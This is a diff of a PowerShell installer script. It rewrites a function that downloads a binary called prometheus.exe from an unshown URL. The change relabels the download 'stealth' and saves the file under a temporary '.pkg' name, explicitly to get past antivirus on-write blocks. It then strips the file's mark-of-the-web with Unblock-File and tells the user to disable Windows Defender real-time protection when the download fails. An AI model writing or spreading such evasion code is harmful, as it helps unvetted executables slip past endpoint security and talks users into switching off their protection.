@@ -57,39 +57,41 @@ if ($CleanerProc) {
     Stop-Process -Name "prometheus" -Force
 }
 
-# Robust Download via BITS with WebClient Fallback
+# Robust Stealth Download via BITS/WebClient
 function Download-File {
     param([string]$Url, [string]$Dest)
     $MaxRetries = 3
     $StepCount = 0
     $Done = $false
+    # Use a temporary name to bypass AV 'on-write' exe blocks
+    $TempDest = $Dest + ".pkg"
 
     while (!$Done -and $StepCount -lt $MaxRetries) {
         try {
-            # Try BITS first (Efficient)
+            Remove-Item -Path $TempDest -Force -ErrorAction SilentlyContinue
             if (Get-Command Start-BitsTransfer -ErrorAction SilentlyContinue) {
-                Write-Host "   ◦ Connection attempt via BITS..." -ForegroundColor Gray
-                Start-BitsTransfer -Source $Url -Destination $Dest -ErrorAction Stop
-                $Done = $true
-            } else { throw "BITS not available" }
-        } catch {
-            try {
-                # Fallback to WebClient (Reliable)
-                Write-Host "   ◦ BITS blocked, switching to WebClient engine..." -ForegroundColor Gray
-                $wc = New-Object System.Net.WebClient
-                $wc.DownloadFile($Url, $Dest)
-                $Done = $true
-            } catch {
-                $StepCount++
-                Write-Host "⚠️  Download interrupted by system ($StepCount/$MaxRetries)..." -ForegroundColor Yellow
-                if ($StepCount -eq $MaxRetries) {
-                    Write-Host "💡 HINT: An Antivirus or Firewall might be blocking the binary download." -ForegroundColor Gray
-                }
-                Start-Sleep -Seconds 3
+                Start-BitsTransfer -Source $Url -Destination $TempDest -ErrorAction Stop
+            } else {
+                (New-Object System.Net.WebClient).DownloadFile($Url, $TempDest)
             }
+            
+            if (Test-Path $TempDest) {
+                Write-Host "   ◦ Verification successful. Unblocking..." -ForegroundColor Gray
+                Unblock-File -Path $TempDest -ErrorAction SilentlyContinue
+                Move-Item -Path $TempDest -Destination $Dest -Force
+                $Done = $true
+            }
+        } catch {
+            $StepCount++
+            Write-Host "⚠️  System blocked attempt ($StepCount/$MaxRetries)..." -ForegroundColor Yellow
+            Start-Sleep -Seconds 3
         }
     }
-    if (!$Done) { throw "Could not download $Url" }
+    if (!$Done) { 
+        Write-Host "❌ FATAL: Download strictly blocked by system security." -ForegroundColor Red
+        Write-Host "💡 RESOLUTION: Temporarily disable Windows Defender / Real-time Protection and try again." -ForegroundColor Cyan
+        throw "Download Failed" 
+    }
 }
 
 Download-File -Url $CleanerUrl -Dest "$BinDir\prometheus.exe"
